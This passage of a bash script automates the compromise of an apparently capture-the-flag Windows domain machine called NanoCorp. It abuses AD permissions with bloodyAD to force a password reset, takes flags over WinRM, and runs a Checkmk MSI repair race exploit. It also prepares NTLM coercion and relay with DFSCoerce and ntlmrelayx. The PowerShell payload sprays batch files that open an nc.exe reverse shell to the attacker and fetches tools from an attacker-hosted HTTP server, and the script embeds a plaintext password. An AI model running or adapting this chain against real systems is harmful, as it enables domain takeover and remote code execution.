            -k --no-pass 2>&1 | tee "$LOG_DIR/bloodhound_k.log" || true
    }

    ok "BloodHound data in: $LOOT_DIR/"
    info "Attack path (from BloodHound analysis):"
    echo -e "
  ${BOLD}${CYAN}WEB_SVC${RESET} ${DIM}──[AddSelf]──▶${RESET} ${BOLD}${CYAN}IT_SUPPORT${RESET}
                    ${DIM}──[ForceChangePassword]──▶${RESET} ${BOLD}${CYAN}MONITORING_SVC${RESET}
                                              ${DIM}──[CanPSRemote]──▶${RESET} ${BOLD}${CYAN}DC01${RESET}
"
    ok "Phase 5 complete"
}

# ─── PHASE 6: PRIVILEGE ESCALATION ──────────────────────────────────────────
phase6_privesc() {
    banner "PHASE 6 AD Privilege Escalation (bloodyAD)"

    # Re-sync time again
    sync_time_with_dc "$TARGET_IP" "$LOG_DIR/timesync_phase6.log" || true
    export KRB5CCNAME=$(find "$WORK_DIR" -name "*WEB_SVC*.ccache" -o -name "*web_svc*.ccache" \
        2>/dev/null | head -1 || echo "")

    step "Adding web_svc to IT_SUPPORT group (using AddSelf ACE)..."
    bloodyAD \
        --host "$DC_HOST" \
        -d nanocorp.htb \
        -u "$WEBSVC_USER" \
        -p "$WEBSVC_PASS" \
        -k \
        add groupMember it_support "$WEBSVC_USER" 2>&1 | \
        tee "$LOG_DIR/bloodyadd.log" || true

    if grep -qi "added\|success\|already" "$LOG_DIR/bloodyadd.log" 2>/dev/null; then
        ok "web_svc → IT_SUPPORT: SUCCESS"
    else
        warn "bloodyAD add may have failed trying without Kerberos..."
        bloodyAD \
            --host "$TARGET_IP" \
            -d nanocorp.htb \
            -u "$WEBSVC_USER" \
            -p "$WEBSVC_PASS" \
            add groupMember it_support "$WEBSVC_USER" 2>&1 | \
            tee "$LOG_DIR/bloodyadd2.log" || true
    fi

    sleep 2

    step "Force-changing monitoring_svc password to: $MONSVC_PASS..."
    bloodyAD \
        --host "$DC_HOST" \
        -d nanocorp.htb \
        -u "$WEBSVC_USER" \
        -p "$WEBSVC_PASS" \
        -k \
        set password "$MONSVC_USER" "$MONSVC_PASS" 2>&1 | \
        tee "$LOG_DIR/bloodypass.log" || true

    if grep -qi "success\|changed\|Password" "$LOG_DIR/bloodypass.log" 2>/dev/null; then
        ok "monitoring_svc password changed to: $MONSVC_PASS"
    else
        warn "Password change may have failed. Trying alternate bloodyAD syntax..."
        bloodyAD \
            --host "$TARGET_IP" \
            -d nanocorp.htb \
            -u "$WEBSVC_USER" \
            -p "$WEBSVC_PASS" \
            set password "$MONSVC_USER" "$MONSVC_PASS" 2>&1 | \
            tee "$LOG_DIR/bloodypass2.log" || true
    fi

    step "Getting Kerberos TGT for monitoring_svc..."
    sync_time_with_dc "$TARGET_IP" "$LOG_DIR/timesync_phase6b.log" || true
    cd "$WORK_DIR"
    impacket-getTGT -dc-ip "$TARGET_IP" \
        "nanocorp.htb/${MONSVC_USER}:${MONSVC_PASS}" 2>&1 | \
        tee "$LOG_DIR/tgt_monsvc.log" || true

    local mon_ccache
    mon_ccache=$(find "$WORK_DIR" -name "*monitoring_svc*.ccache" -o -name "*MONITORING*.ccache" \
        2>/dev/null | head -1 || echo "")
    if [[ -n "$mon_ccache" ]]; then
        export KRB5CCNAME="$mon_ccache"
        MONITOR_CCACHE="$mon_ccache"
        ok "TGT for monitoring_svc: $mon_ccache"
        if command -v klist &>/dev/null; then
            klist 2>/dev/null | head -5 || true
        else
            warn "klist not found skipping Kerberos ticket display"
        fi
    fi

    info "Credentials Summary:"
    echo -e "  ${BOLD}${GREEN}web_svc:${RESET}         $WEBSVC_PASS"
    echo -e "  ${BOLD}${GREEN}monitoring_svc:${RESET}  $MONSVC_PASS"
    {
        echo "=== NANOCORP CREDENTIALS ==="
        echo "web_svc        : $WEBSVC_PASS"
        echo "monitoring_svc : $MONSVC_PASS"
        echo "Administrator  : (obtained via RunasCs or NTLM relay)"
    } > "$LOOT_DIR/credentials.txt"

    ok "Phase 6 complete"
}

# ─── PHASE 7: USER FLAG ───────────────────────────────────────────────────────
phase7_user_flag() {
    banner "PHASE 7 User Flag Auto-Capture (WinRM non-interactive)"

    seed_state_from_legacy
    ensure_tool_repo "winrmexec" "https://github.com/ozelis/winrmexec.git" || true

    local user_flag=""
    local -a cmds=(
        'cmd /c type C:\Users\monitoring_svc\Desktop\user.txt'
        'powershell -NoProfile -NonInteractive -Command "Get-Content C:\Users\monitoring_svc\Desktop\user.txt"'
        'cmd /c for /f %i in ('\''dir /b /s C:\Users\*\Desktop\user.txt'\'' ) do @type "%i"'
    )
    local out cmd

    CAPTURED_USER_FLAG=""
    capture_user_flag_once() {
        local local_flag="" mon_ccache

        mon_ccache=$(find "$WORK_DIR" -maxdepth 1 -type f \( -iname "*monitoring_svc*.ccache" -o -iname "*monitoring*.ccache" \) \
            2>/dev/null | head -1 || echo "")
        if [[ -n "$mon_ccache" ]]; then
            MONITOR_CCACHE="$mon_ccache"
            export KRB5CCNAME="$mon_ccache"
            ok "Using monitoring_svc ccache: $mon_ccache"
        fi

        step "Checking WinRM auth with monitoring_svc..."
        out=$(run_netexec_winrm_cmd "whoami" "$LOG_DIR/netexec_winrm_auth.log" || true)
        if echo "$out" | grep -qiE "Pwn3d|SUCCESS|\\[\\+\\]"; then
            ok "WinRM authentication works for ${MONSVC_USER}"
        else
            warn "WinRM auth check inconclusive; continuing with command execution attempts (SSL:5986)"
        fi

        step "Trying automated user flag commands via netexec..."
        for cmd in "${cmds[@]}"; do
            out=$(run_netexec_winrm_cmd "$cmd" "$LOG_DIR/netexec_userflag.log" || true)
            local_flag=$(echo "$out" | extract_flag_token || true)
            [[ -n "$local_flag" ]] && break
        done

        if [[ -z "$local_flag" ]]; then
            step "Netexec path failed; trying impacket-wmiexec fallback..."
            if [[ -n "$MONITOR_CCACHE" && -f "$MONITOR_CCACHE" ]]; then
                out=$(impacket-wmiexec -k -no-pass -dc-ip "$TARGET_IP" \
                      "${DOMAIN}/${MONSVC_USER}@${DC_HOST}" \
                      "cmd /c type C:\\Users\\monitoring_svc\\Desktop\\user.txt" 2>&1 | tee "$LOG_DIR/wmiexec_userflag.log" || true)
            else
                out=$(impacket-wmiexec "${NETBIOS_DOMAIN}/${MONSVC_USER}:${MONSVC_PASS}@${TARGET_IP}" \
                      "cmd /c type C:\\Users\\monitoring_svc\\Desktop\\user.txt" 2>&1 | tee "$LOG_DIR/wmiexec_userflag.log" || true)
            fi
            local_flag=$(echo "$out" | extract_flag_token || true)
        fi

        if [[ -z "$local_flag" ]]; then
            step "WMI path failed; trying winrmexec fallback..."
            for cmd in "${cmds[@]}"; do
                out=$(run_winrmexec_cmd "$cmd" "$LOG_DIR/winrmexec_userflag.log" || true)
                local_flag=$(echo "$out" | extract_flag_token || true)
                [[ -n "$local_flag" ]] && break
            done
        fi

        CAPTURED_USER_FLAG="$local_flag"
    }

    capture_user_flag_once
    user_flag="$CAPTURED_USER_FLAG"
    if [[ -z "$user_flag" ]]; then
        warn "User flag capture failed. Attempting automatic credential refresh via phase 6, then retry..."
        phase6_privesc || true
        capture_user_flag_once
        user_flag="$CAPTURED_USER_FLAG"
    fi

    if [[ -n "$user_flag" ]]; then
        save_flag_file "user" "$user_flag" || true
    else
        warn "Could not auto-capture user flag. Check logs:"
        warn "  $LOG_DIR/netexec_userflag.log"
        warn "  $LOG_DIR/wmiexec_userflag.log"
        warn "  $LOG_DIR/winrmexec_userflag.log"
    fi

    ok "Phase 7 complete"
}

# ─── PHASE 8a: ROOT PATH A Checkmk MSI Race ────────────────────────────────
phase8a_root_checkmk() {
    banner "PHASE 8A Root via Checkmk MSI Race Condition (RunasCs)"
    LHOST=$(get_tun0_ip)
    seed_state_from_legacy
    ensure_tool_repo "RunasCs" "https://github.com/antonioCoco/RunasCs" || true

    info "This path exploits Checkmk 2.1.0p10 MSI repair race condition"
    info "Requirements: monitoring_svc WinRM shell, RunasCs.cs, nc.exe"
    info "Attacker IP: $LHOST"

    # ── Prepare bad.ps1 ─────────────────────────────────────────────────────
    local lport http_port
    lport=$(choose_bind_port 443 9001 8443)
    http_port=$(choose_bind_port 80 8080 8000)
    if [[ -z "$lport" || "$lport" == "0" || -z "$http_port" || "$http_port" == "0" ]]; then
        warn "Could not allocate local listener ports for Path A"
        return 1
    fi
    local bad_ps1="$WORK_DIR/bad.ps1"

    step "Generating MSI race condition exploit (bad.ps1) with LHOST=$LHOST LPORT=$lport..."

    cat > "$bad_ps1" << 'POWERSHELL'
param(
    [int]\$MinPID    = 1000,
    [int]\$MaxPID    = 15000,
    [string]\$LHOST  = "__LHOST__",
    [string]\$LPORT  = "__LPORT__"
)

# 1. Define the malicious batch payload
\$NcPath       = "C:\\Windows\\Temp\\nc.exe"
\$BatchPayload = "@echo off`r`n\$NcPath -e cmd.exe \$LHOST \$LPORT"

# 2. Find the Checkmk MSI in installer cache
\$msi = (Get-ItemProperty `
  'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products\\*\\InstallProperties' |
  Where-Object { \$_.DisplayName -like '*mk*' -or \$_.DisplayName -like '*check*' } |
  Select-Object -First 1).LocalPackage

if (!\$msi) {
    Write-Error "[!] Could not find Checkmk MSI. Trying fallback..."
    \$msi = (Get-ChildItem "C:\\Windows\\Installer\\" -Filter "*.msi" |
            Sort-Object LastWriteTime -Descending | Select-Object -First 1).FullName
}

if (!\$msi) {
    Write-Error "[!] No MSI found at all. Exiting."
    exit 1
}
Write-Host "[*] Found MSI at \$msi"

# 3. Spray .cmd files for race condition (PID range 1000–15000)
Write-Host "[*] Seeding \$MinPID to \$MaxPID cmd files..."
foreach (\$ctr in 0..1) {
    for (\$num = \$MinPID; \$num -le \$MaxPID; \$num++) {
        \$filePath = "C:\\Windows\\Temp\\cmk_all_\$(\$num)_\$(\$ctr).cmd"
        try {
            [System.IO.File]::WriteAllText(\$filePath, \$BatchPayload,
                [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path \$filePath -Name IsReadOnly -Value \$true `
                -ErrorAction SilentlyContinue
        } catch {
            # ignore write errors
        }
    }
}
Write-Host "[*] Seeding complete (30,000 files created)."

# 4. Trigger MSI repair as web_svc context
Write-Host "[*] Triggering MSI repair this grants web_svc execution..."
Start-Process "msiexec.exe" -ArgumentList `
    "/fa \`"\$msi\`" /qn /l*vx C:\\Windows\\Temp\\cmk_repair.log" -Wait

Write-Host "[*] Trigger sent. Check your listener at __LHOST__:__LPORT__"
POWERSHELL
    sed -i "s/__LHOST__/${LHOST}/g; s/__LPORT__/${lport}/g" "$bad_ps1"

    ok "bad.ps1 written to: $bad_ps1"

    # ── Prepare serving directory ────────────────────────────────────────────
    local serve_dir="$WORK_DIR/serve"
    mkdir -p "$serve_dir"
    cp "$bad_ps1" "$serve_dir/"

    # Copy RunasCs and nc.exe if available
    local runascs_cs
    runascs_cs=$(find "$TOOLS_DIR/RunasCs" -name "RunasCs.cs" 2>/dev/null | head -1 || echo "")
    if [[ -n "$runascs_cs" ]]; then
        cp "$runascs_cs" "$serve_dir/"
        ok "RunasCs.cs staged"
    else
        warn "RunasCs.cs not found clone from https://github.com/antonioCoco/RunasCs"
    fi

    local nc_bin
    nc_bin=$(find /usr/share -name "nc.exe" 2>/dev/null | head -1 || \
             find /opt -name "nc.exe" 2>/dev/null | head -1 || echo "")
    if [[ -n "$nc_bin" ]]; then
        cp "$nc_bin" "$serve_dir/"
        ok "nc.exe staged"
    else
        warn "nc.exe not found. Common locations: /usr/share/windows-resources/binaries/nc.exe"
        warn "You can also use: https://github.com/int0x33/nc.exe/raw/master/nc.exe"
        warn "Manually copy nc.exe to: $serve_dir/"
    fi

    # ── Print execution instructions ─────────────────────────────────────────
    step "Starting HTTP server to serve files (port $http_port)..."
    cd "$serve_dir"
    python3 -m http.server "$http_port" > "$LOG_DIR/http_server.log" 2>&1 &
    HTTP_PID=$!
    sleep 1
    if ! kill -0 "$HTTP_PID" 2>/dev/null; then
        warn "HTTP server failed to start on port $http_port (check $LOG_DIR/http_server.log)"
        return 1
    fi
    ok "HTTP server PID: $HTTP_PID Serving from: $serve_dir"

    step "Starting Netcat listener on port $lport..."
    echo -e "\n${BOLD}${YELLOW}══ ACTION REQUIRED: Open a NEW TERMINAL and run: ══${RESET}"
    echo -e "  ${CYAN}nc -lvnp $lport${RESET}"
    echo

    echo -e "\n${BOLD}${CYAN}══ Then, in your monitoring_svc WinRM shell, run: ══${RESET}"
    cat <<INSTRUCTIONS

# Step 1 Navigate to writable temp
cd C:\\Windows\\Temp

# Step 2 Download nc.exe
wget http://${LHOST}:${http_port}/nc.exe -UseBasicParsing -OutFile "nc.exe"

# Step 3 Download RunasCs.cs
wget "http://${LHOST}:${http_port}/RunasCs.cs" -UseBasicParsing -OutFile "RunasCs.cs"

# Step 4 Compile RunasCs.exe on the target
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe \`
  -target:exe -optimize -out:RunasCs.exe RunasCs.cs

# Step 5 Download bad.ps1
wget http://${LHOST}:${http_port}/bad.ps1 -UseBasicParsing -OutFile "bad.ps1"

# Step 6 Execute as web_svc via RunasCs
.\\RunasCs.exe web_svc "dksehdgh712!@#" \`
  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \`
  -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\bad.ps1"

# ─── On your netcat listener (port $lport) you will get shell as Administrator ───

# Step 7 Grab root flag:
cd C:\\Users\\Administrator\\Desktop
type root.txt

INSTRUCTIONS

    echo -e "${BOLD}${RED}[!] Cleanup commands (run in monitoring_svc shell if exploit fails):${RESET}"
    cat <<CLEANUP
Stop-Process -Name powershell -Force -ErrorAction SilentlyContinue
Stop-Process -Name msiexec -Force -ErrorAction SilentlyContinue
Remove-Item C:\\Windows\\Temp\\cmk_all_*.cmd -Force -ErrorAction SilentlyContinue
Remove-Item C:\\Windows\\Temp\\cmk_repair.log -Force -ErrorAction SilentlyContinue
CLEANUP

    echo
    echo -e "${BOLD}${YELLOW}Press ENTER once you have the root flag, then paste it here:${RESET}"
    echo -n "Root flag (or press ENTER to skip): "
    read -r root_flag

    if [[ -n "$root_flag" ]]; then
        echo "$root_flag" > "$LOOT_DIR/root.txt"
        flag "$root_flag"
        pwned "NanoCorp"
    else
        warn "Root flag not captured yet"
    fi

    kill $HTTP_PID 2>/dev/null || true
}

phase8a_root_checkmk_auto() {
    banner "PHASE 8A-AUTO Checkmk MSI Race via RunasCs (Automated)"
    LHOST=$(get_tun0_ip)
    seed_state_from_legacy
    ensure_tool_repo "RunasCs" "https://github.com/antonioCoco/RunasCs" || true
    ensure_tool_repo "winrmexec" "https://github.com/ozelis/winrmexec.git" || true
    local http_port
    local serve_dir="$WORK_DIR/serve"
    local bad_ps1="$serve_dir/bad.ps1"
    local runascs_src="$TOOLS_DIR/RunasCs/RunasCs.cs"
    local runascs_tmp="$WORK_DIR/tools/RunasCs_compat.cs"
    local runascs_exe="$serve_dir/RunasCs.exe"
    local mon_ccache trigger_cmd out root_val user_val
    local http_pid i
    http_port=$(choose_bind_port 80 8080 8000)
    if [[ -z "$http_port" || "$http_port" == "0" ]]; then
        warn "Could not allocate local HTTP staging port for Path A auto"
        return 1
    fi

    mkdir -p "$serve_dir" "$WORK_DIR/tools"

    mon_ccache=$(find_monitor_ccache || true)
    if [[ -n "$mon_ccache" ]]; then
        MONITOR_CCACHE="$mon_ccache"
        export KRB5CCNAME="$MONITOR_CCACHE"
        ok "Using monitoring_svc ccache for Phase 8A: $MONITOR_CCACHE"
    else
        warn "monitoring_svc ccache not found in workdirs; WinRM Kerberos path may fail"
    fi

    # First, try a credential-based mode that does not require target -> attacker downloads.
    if phase8a_root_checkmk_auto_credmode; then
        return 0
    fi
    warn "Credential-based Path A did not capture root. Trying RunasCs staged mode..."

    [[ -f "$runascs_src" ]] || { warn "RunasCs.cs not found at $runascs_src"; return 1; }

    # Build a compatibility variant for older .NET runtimes on target.
    python3 - "$runascs_src" "$runascs_tmp" << 'PY'
import sys
src = open(sys.argv[1], 'r', encoding='utf-8').read()
src = src.replace("commandline.Split(' ')", "commandline.Split(new char[] {' '})")
src = src.replace("remote.Split(':')", "remote.Split(new char[] {':'})")
open(sys.argv[2], 'w', encoding='utf-8').write(src)
PY
    if ! mcs -out:"$runascs_exe" "$runascs_tmp" >> "$LOG_DIR/checkmk_auto.log" 2>&1; then
        warn "Failed to compile compatibility RunasCs.exe (see $LOG_DIR/checkmk_auto.log)"
        return 1
    fi
    chmod 0755 "$runascs_exe"
    ok "Staged RunasCs.exe (compat build): $runascs_exe"

    cat > "$bad_ps1" << 'POWERSHELL'
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000
)

$Payload = "@echo off`r`ncmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Windows\Temp\root_flag.txt 2>nul`r`ncmd /c type C:\Users\monitoring_svc\Desktop\user.txt > C:\Windows\Temp\user_flag.txt 2>nul`r`ncmd /c icacls C:\Windows\Temp\root_flag.txt /grant Everyone:F >nul 2>nul`r`ncmd /c icacls C:\Windows\Temp\user_flag.txt /grant Everyone:F >nul 2>nul"
$msi = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  Where-Object { $_.DisplayName -like "*mk*" -or $_.DisplayName -like "*check*" } |
  Select-Object -First 1).LocalPackage
if (!$msi) {
  $msi = (Get-ChildItem "C:\Windows\Installer\" -Filter "*.msi" | Sort-Object LastWriteTime -Descending | Select-Object -First 1).FullName
}
if (!$msi) { exit 1 }
foreach ($ctr in 0..1) {
  for ($num = $MinPID; $num -le $MaxPID; $num++) {
    $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
    try {
      [System.IO.File]::WriteAllText($filePath, $Payload, [System.Text.Encoding]::ASCII)
      Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
    } catch {}
  }
}
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
POWERSHELL

    step "Starting HTTP server for staged payloads on port $http_port..."
    cd "$serve_dir"
    python3 -m http.server "$http_port" > "$LOG_DIR/http_server.log" 2>&1 &
    http_pid=$!
    sleep 1
    if ! kill -0 "$http_pid" 2>/dev/null; then
        warn "HTTP server failed to start on port $http_port (check $LOG_DIR/http_server.log)"
        return 1
    fi
    ok "HTTP server PID: $http_pid"

    step "Staging RunasCs.exe and bad.ps1 on target via WinRM..."
    out=$(run_winrmexec_cmd "powershell -NoP -NonI -ExecutionPolicy Bypass -Command \"iwr http://${LHOST}:${http_port}/RunasCs.exe -UseBasicParsing -OutFile C:\\Windows\\Temp\\RunasCs.exe; Test-Path C:\\Windows\\Temp\\RunasCs.exe\"" "$LOG_DIR/checkmk_auto.log" || \
        run_netexec_winrm_cmd "powershell -NoP -NonI -ExecutionPolicy Bypass -Command \"iwr http://${LHOST}:${http_port}/RunasCs.exe -UseBasicParsing -OutFile C:\\Windows\\Temp\\RunasCs.exe; Test-Path C:\\Windows\\Temp\\RunasCs.exe\"" "$LOG_DIR/checkmk_auto.log" || true)
    echo "$out" >> "$LOG_DIR/checkmk_auto.log"
    if ! echo "$out" | grep -qi "True"; then
        warn "RunasCs.exe staging failed (see $LOG_DIR/checkmk_auto.log)"
        kill "$http_pid" 2>/dev/null || true
        return 1
    fi
    out=$(run_winrmexec_cmd "powershell -NoP -NonI -ExecutionPolicy Bypass -Command \"iwr http://${LHOST}:${http_port}/bad.ps1 -UseBasicParsing -OutFile C:\\Windows\\Temp\\bad.ps1; Test-Path C:\\Windows\\Temp\\bad.ps1\"" "$LOG_DIR/checkmk_auto.log" || \
        run_netexec_winrm_cmd "powershell -NoP -NonI -ExecutionPolicy Bypass -Command \"iwr http://${LHOST}:${http_port}/bad.ps1 -UseBasicParsing -OutFile C:\\Windows\\Temp\\bad.ps1; Test-Path C:\\Windows\\Temp\\bad.ps1\"" "$LOG_DIR/checkmk_auto.log" || true)
    echo "$out" >> "$LOG_DIR/checkmk_auto.log"
    if ! echo "$out" | grep -qi "True"; then
        warn "bad.ps1 staging failed (see $LOG_DIR/checkmk_auto.log)"
        kill "$http_pid" 2>/dev/null || true
        return 1
    fi

    trigger_cmd='C:\Windows\Temp\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1"'
    out=$(run_winrmexec_cmd "$trigger_cmd" "$LOG_DIR/checkmk_auto.log" || run_netexec_winrm_cmd "$trigger_cmd" "$LOG_DIR/checkmk_auto.log" || true)
    echo "$out" >> "$LOG_DIR/checkmk_auto.log"
    if echo "$out" | grep -qiE "Unhandled Exception|MissingMethodException|error"; then
        warn "RunasCs trigger reported errors (see $LOG_DIR/checkmk_auto.log)"
    else
        info "RunasCs trigger sent"
    fi

    step "Polling C:\\Windows\\Temp\\root_flag.txt for root flag..."
    root_val=""
    user_val=""
    for ((i=1; i<=90; i++)); do
        out=$(run_winrmexec_cmd "cmd /c type C:\\Windows\\Temp\\root_flag.txt" "$LOG_DIR/checkmk_auto.log" || run_netexec_winrm_cmd "cmd /c type C:\\Windows\\Temp\\root_flag.txt" "$LOG_DIR/checkmk_auto.log" || true)
        root_val=$(echo "$out" | extract_flag_token || true)
        if [[ -n "$root_val" ]]; then
            out=$(run_winrmexec_cmd "cmd /c type C:\\Windows\\Temp\\user_flag.txt" "$LOG_DIR/checkmk_auto.log" || run_netexec_winrm_cmd "cmd /c type C:\\Windows\\Temp\\user_flag.txt" "$LOG_DIR/checkmk_auto.log" || true)
            user_val=$(echo "$out" | extract_flag_token || true)
            [[ -n "$user_val" ]] && save_flag_file "user" "$user_val" || true
            save_flag_file "root" "$root_val" || true
            pwned "NanoCorp"
            kill "$http_pid" 2>/dev/null || true
            return 0
        fi
        sleep 3
    done

    warn "Automatic Path-A did not capture root flag artifact within timeout"
    warn "Check: $LOG_DIR/checkmk_auto.log"
    kill "$http_pid" 2>/dev/null || true
    return 1
}

phase8a_root_checkmk_auto_credmode() {
    local bad_ps1 create_ps trigger_ps create_cmd trigger_cmd out
    local root_flag="" user_flag="" i

    step "Path-A credential mode: writing exploit script directly via WinRM (no download hosting)..."

    bad_ps1="$(cat <<'POWERSHELL'
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000
)

$Payload = "@echo off`r`ncmd /c type C:\Users\Administrator\Desktop\root.txt > C:\Windows\Temp\root_flag.txt 2>nul`r`ncmd /c type C:\Users\monitoring_svc\Desktop\user.txt > C:\Windows\Temp\user_flag.txt 2>nul"
$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
  Where-Object { $_.DisplayName -like '*mk*' -or $_.DisplayName -like '*check*' } |
  Select-Object -First 1).LocalPackage
if (!$msi) {
    $msi = (Get-ChildItem "C:\Windows\Installer\" -Filter "*.msi" | Sort-Object LastWriteTime -Descending | Select-Object -First 1).FullName
}
if (!$msi) { exit 1 }

foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            [System.IO.File]::WriteAllText($filePath, $Payload, [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        } catch {}
    }
}
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
POWERSHELL
)"

    create_ps="$(
cat <<POWERSHELL
\$b='$(printf '%s' "$bad_ps1" | base64 -w0)';
[System.IO.File]::WriteAllBytes('C:\Windows\Temp\bad.ps1',[Convert]::FromBase64String(\$b));
if (Test-Path 'C:\Windows\Temp\bad.ps1') { 'BADPS1_OK' } else { 'BADPS1_FAIL' }
POWERSHELL
)"
    create_cmd="powershell -NoP -NonI -ExecutionPolicy Bypass -EncodedCommand $(ps_to_b64 "$create_ps")"
    out=$(run_winrmexec_cmd "$create_cmd" "$LOG_DIR/checkmk_auto.log" || run_netexec_winrm_cmd "$create_cmd" "$LOG_DIR/checkmk_auto.log" || true)
    echo "$out" >> "$LOG_DIR/checkmk_auto.log"
    if ! echo "$out" | grep -q "BADPS1_OK"; then
        warn "Failed to write bad.ps1 on target in credential mode"
        return 1
    fi

    step "Triggering bad.ps1 as ${DOMAIN}\\${WEBSVC_USER} (credential mode)..."
    trigger_ps="$(
cat <<POWERSHELL
\$pw=ConvertTo-SecureString '${WEBSVC_PASS}' -AsPlainText -Force;
\$cred=New-Object System.Management.Automation.PSCredential('${DOMAIN}\\${WEBSVC_USER}',\$pw);
Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Credential \$cred -ArgumentList '-NoP -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1' -Wait;
'TRIGGER_SENT'
POWERSHELL
)"
    trigger_cmd="powershell -NoP -NonI -ExecutionPolicy Bypass -EncodedCommand $(ps_to_b64 "$trigger_ps")"
    out=$(run_winrmexec_cmd "$trigger_cmd" "$LOG_DIR/checkmk_auto.log" || run_netexec_winrm_cmd "$trigger_cmd" "$LOG_DIR/checkmk_auto.log" || true)
    echo "$out" >> "$LOG_DIR/checkmk_auto.log"
    if ! echo "$out" | grep -q "TRIGGER_SENT"; then
        warn "Credential-mode trigger failed for web_svc"
        return 1
    fi

    step "Polling C:\\Windows\\Temp\\root_flag.txt for root flag..."
    for ((i=1; i<=80; i++)); do
        out=$(run_winrmexec_cmd "cmd /c type C:\\Windows\\Temp\\root_flag.txt" "$LOG_DIR/checkmk_auto.log" || run_netexec_winrm_cmd "cmd /c type C:\\Windows\\Temp\\root_flag.txt" "$LOG_DIR/checkmk_auto.log" || true)
        root_flag=$(echo "$out" | extract_flag_token || true)
        if [[ -n "$root_flag" ]]; then
            user_flag=$(run_winrmexec_cmd "cmd /c type C:\\Windows\\Temp\\user_flag.txt" "$LOG_DIR/checkmk_auto.log" | extract_flag_token || true)
            [[ -n "$user_flag" ]] && save_flag_file "user" "$user_flag" || true
            save_flag_file "root" "$root_flag" || true
            pwned "NanoCorp"
            return 0
        fi
        sleep 3
    done

    warn "Credential mode did not produce root flag artifact within timeout"
    return 1
}

# ─── PHASE 8b: ROOT PATH B NTLM Coercion + Relay ───────────────────────────
phase8b_root_relay() {
    banner "PHASE 8B Root via NTLM Coercion → ntlmrelayx → SYSTEM"
    LHOST=$(get_tun0_ip)
    seed_state_from_legacy
    ensure_tool_repo "krbrelayx" "https://github.com/dirkjanm/krbrelayx" || true
    ensure_tool_repo "DFSCoerce" "https://github.com/Wh04m1001/DFSCoerce" || true

    info "Attack: DFSCoerce → ntlmrelayx → WinRM relay → SYSTEM shell"

    # Cleanup stale listeners from interrupted runs (common cause of failure)
    pkill -f "ntlmrelayx.py|impacket-ntlmrelayx|responder" 2>/dev/null || true
    fuser -k 445/tcp 2>/dev/null || true
    sleep 1

    local dnstool="$TOOLS_DIR/krbrelayx/dnstool.py"
    local dfscoerce_py="$TOOLS_DIR/DFSCoerce/dfscoerce.py"
    local relay_log="$LOG_DIR/ntlmrelayx.log"
    local coercer_log="$LOG_DIR/dfscoerce.log"
    local dns_log="$LOG_DIR/dnstool.log"
    local ntlmrelayx_bin relay_pid relay_port=""
    local dns_record_ok=0
    local out user_flag="" root_flag="" cmd

    # ── Step 1: Add attacker DNS A record (best-effort) ──────────────────────
    step "Step B-1: Adding attacker DNS A record in AD (best effort)..."
    : > "$dns_log"
    if [[ -f "$dnstool" ]]; then
        python3 "$dnstool" \
            -u "${DOMAIN}\\${WEBSVC_USER}" \
            -p "$WEBSVC_PASS" \
            -r "attacker" \
            -a add \
            -t A \
            -d "$LHOST" \
            "$TARGET_IP" 2>&1 | tee -a "$dns_log" || true

        if ! grep -qiE "LDAP operation completed|Bind OK|already exists|success" "$dns_log"; then
            # Alternate dnstool syntax (krbrelayx variants differ)
            python3 "$dnstool" \
                -u "${DOMAIN}\\${WEBSVC_USER}" \
                -p "$WEBSVC_PASS" \
                "$DOMAIN" \
                -dc-ip "$TARGET_IP" \
                -dns-ip "$TARGET_IP" \
                -a add \
                -d "$LHOST" \
                -r "attacker" 2>&1 | tee -a "$dns_log" || true
        fi

        if grep -qiE "insufficientAccessRights|INSUFF_ACCESS_RIGHTS|ldap operation failed" "$dns_log"; then
            warn "DNS record add failed due ACL/permissions (continuing with direct-IP coercion)"
            dns_record_ok=0
        elif grep -qiE "LDAP operation completed|already exists|success" "$dns_log"; then
            ok "DNS record step complete"
            dns_record_ok=1
        else
            warn "DNS record step inconclusive; continuing anyway"
        fi
    else
        warn "dnstool.py not found at $dnstool; continuing"
    fi

    # ── Step 2: Start ntlmrelayx + trigger coercion (multi-attempt) ──────────
    step "Step B-2: Starting ntlmrelayx + DFSCoerce (multi-attempt)..."
    ntlmrelayx_bin=$(command -v impacket-ntlmrelayx || command -v ntlmrelayx.py || echo "")
    [[ -n "$ntlmrelayx_bin" ]] || { warn "ntlmrelayx not found"; return 1; }

    if [[ ! -f "$dfscoerce_py" ]]; then
        warn "DFSCoerce script not found at $dfscoerce_py"
        return 1
    fi

    local listener target relay_target i ready
    local -a listeners=("$LHOST")
    local -a relay_targets=("winrms://$TARGET_IP" "winrms://$DC_HOST")
    (( dns_record_ok == 1 )) && listeners+=("attacker.${DOMAIN}")

    : > "$relay_log"
    : > "$coercer_log"

    for relay_target in "${relay_targets[@]}"; do
        info "Relay target: $relay_target"
        : > "$relay_log"
